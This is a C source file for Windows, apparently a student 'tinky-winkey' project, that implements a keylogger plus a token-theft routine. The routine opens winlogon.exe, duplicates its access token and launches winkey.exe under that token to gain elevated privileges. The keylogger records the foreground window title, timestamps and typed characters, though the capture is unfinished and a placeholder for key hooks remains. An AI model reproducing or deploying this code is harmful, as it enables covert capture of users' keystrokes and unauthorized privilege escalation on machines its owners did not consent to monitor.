#include "winkey.h"
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <iostream>
#include <psapi.h>
#include <string>
#include <time.h>
#include <conio.h>



DWORD GetPidByName()
{
    char* filename = "winlogon.exe";
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(PROCESSENTRY32);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            CloseHandle(hSnapShot);
            return(pEntry.th32ProcessID);
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
    return(0);
}

void    Tinky_Winky() {
    DWORD winlogonPID;
    HANDLE wlPH;
    HANDLE wlTH;
    HANDLE newExecToken;
    PROCESS_INFORMATION winkeyPI;
    char Path[260];
    LPWSTR PP = L"c:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";

    winlogonPID = GetPidByName();
    wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
    if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
        printf("opt\n");
    }
    CloseHandle(wlPH);
    if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
        printf("dtEx\n");
    }
    CloseHandle(wlTH);
    GetCurrentDirectory(260, Path);
    strcat(Path, "\\winkey.exe 1337");
    int i = 0;

    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, NULL, NULL, NULL, NULL, &winkeyPI)) {
        printf("cpwt (%d)\n", GetLastError());
    }
}

void getTime(char **timebuf) {
    time_t ltime;
    struct tm  tstruct;
    char buff[80];
    ltime = time(0);
    tstruct = *localtime(&ltime);
    strftime(buff, sizeof(buff), "%d-%m-%Y %X", &tstruct);
    strcpy(*timebuf, buff);
}

void    KeyLogger() {
    HWND currWindow;
    char title[256];
    char* timebuf;
    char ch;
    timebuf = (char*)malloc(sizeof(char) * 80);
    while (1) {
        currWindow = GetForegroundWindow();
        GetWindowText(currWindow, title, sizeof(title));
        getTime(&timebuf);
        printf("[ %s ] - ", timebuf);
        printf(" '%s'\n", title);
        ch = getch();
        printf("%c", ch);
        while (currWindow == GetForegroundWindow()){
            ch = getch();
            printf("%c", ch);
            ///key hooks

        }
        getTime(&timebuf);
        printf("[ %s ] - ", timebuf);
        printf(" 'window changed'\n");
        Sleep(200);
    }
}

int main(int ac, char **av) {
    char* pass = "1337";
    if (ac == 2 && !strcmp(av[1], "1337")) {
        Tinky_Winky();
        return 0;
    }
    KeyLogger();
    return 0;
}